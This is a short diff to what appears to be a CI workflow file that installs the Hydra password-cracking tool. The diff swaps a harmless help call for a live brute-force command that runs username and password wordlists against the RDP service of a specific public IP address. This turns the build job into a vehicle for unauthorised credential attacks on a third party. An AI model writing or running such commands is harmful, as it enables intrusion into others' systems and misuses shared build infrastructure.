@@ -11,4 +11,4 @@ jobs:
         run: sudo apt-get install hydra-gtk
       - name: Hydra
         run: |
-         hydra -h
+         hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://96.65.26.181
